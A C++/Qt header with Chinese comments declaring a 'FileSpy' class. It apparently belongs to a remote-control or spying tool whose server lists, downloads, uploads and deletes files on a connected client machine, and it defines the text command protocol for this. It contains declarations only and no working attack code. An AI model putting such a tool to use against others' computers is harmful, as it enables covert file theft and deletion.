/*
 *  Author: sumkee911@gmail.com
 *  Date: 2016-12-23
 *  Brief: 从客户端查找文件，删除文件，下载文件，上传文件
 *
 */

#ifndef FILESPY_H
#define FILESPY_H

#include <QWidget>
#include <QLabel>
#include <QApplication>
#include <QDesktopWidget>
#include <QListWidget>
#include "tcpserver.h"
#include "tcpsocket.h"
#include <QMenu>
#include <QDir>
#include <QFileIconProvider>
#include <QMessageBox>
#include "filetransfer.h"

class FileSpy : public QWidget
{
    Q_OBJECT
public:
    explicit FileSpy(QWidget *parent = 0);

    // 服务端向客户端发送的指令(你觉得有需要你也可以增加自己的指令)
    const QByteArray CmdGetDirFiles = "GET_DIRS_FILES";   // 获取路径下的所有文件名和路径名
    const QByteArray CmdDownloadFile = "DOWNLOAD_FILE";   // 服务端从客户也下载文件
    const QByteArray CmdUploadFile = "UPLOAD_FILE";       // 服务端上传文件到客户端
    const QByteArray CmdDeleteFile = "DELETE_FILE";       // 服务端在客户端删除文件

    // 客户端向服务端发送的指令(你觉得有需要你也可以增加自己的指令)
    const QByteArray CmdSendDrives = "SEND_DRIVES";        // 发送盘符
    const QByteArray CmdSendDirs = "SEND_DIRS";            // 发送路径下的所有路径名
    const QByteArray CmdSendFiles = "SEND_FILES";          // 发送路径下的所有文件名
    const QByteArray CmdDeleteFileSuccess = "DELETE_SUCCESS";  // 成功删除文件
    const QByteArray CmdDeleteFileFailed = "DELETE_FAILED";    // 删除文件失败

    // 分割符号和结束符号，比如获取文件夹所有文件命令:FILES<分割符>FILEA<文件分割符>FILEB<文件分割符>FILEC<结束符号>
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";
    const QByteArray CmdFileSplit = "|";

    // 文件类型
    const QByteArray FileTypeDrive = "drive";
    const QByteArray FileTypeDir = "dir";
    const QByteArray FileTypeFile = "file";

    // 开始监控服务器，然后返回新的端口号
    int startFileSpyServer(QString userName);

private:
    QListWidget *mClientFileList;   // 客户端文件列表
    QListWidget *mServerFileList;   // 本机文件列表
    QMenu *mClientMenu;             // 对客户端列表的操作菜单
    QMenu *mServerMenu;             // 对本机列表的操作菜单
    QDir _curClientDir;      // 当前客户路径
    QDir _curServerDir;      // 当前本机路径
    TcpServer *mServer;     // 文件监控服务端
    TcpSocket *mSock;       // 客户端
    QString _userName;

    // 对列表的操作
    const QByteArray _dirBack = ".."; // 返回上一页
    void addFilesToList(QListWidget *list, QList<QByteArray> strList, QFileIconProvider::IconType iconType, QString type);
    QStringList getCurrentFile(QListWidget *list);
    QList<QByteArray> getLocalDrives();
    QList<QByteArray> getLocalDirs(QDir dir);
    QList<QByteArray> getLocalFiles(QDir dir);

    // 处理指令
    void processCommand(QByteArray &cmd, QByteArray &args);
    // 分解指令的参数，反回哈希表
    QHash<QByteArray, QByteArray> parseArgs(QByteArray &args);
    // 处理相应的指令
    void doSendDrives(QHash<QByteArray, QByteArray> &args);
    void doSendDirs(QHash<QByteArray, QByteArray> &args);
    void doSendFiles(QHash<QByteArray, QByteArray> &args);

signals:

public slots:
    // 加载客户端目录
    void loadClientDir(QListWidgetItem *item);
    // 刷新客户列表
    void refreshClientList();
    // 刷新客户列表
    void refreshClientList(QDir dir);
    // 下载文件
    void downloadFile();
    // 删除文件
    void deleteFile();

    // 加载本机目录
    void loadServerDir(QListWidgetItem *item);
    void loadServerDir(QDir dir);
    // 刷新本机列表
    void refreshServerList();
    // 上传本机文件
    void uploadFile();

    // 有新客户连接
    void newConnection(QTcpSocket *s);
    // 处理新数据
    void processBuffer();

protected:
    // 事件过滤，主要用来截取弹出菜单事件
    bool eventFilter(QObject *watched, QEvent *event);

    // 关闭
    void closeEvent(QCloseEvent *);
};

#endif // FILESPY_H
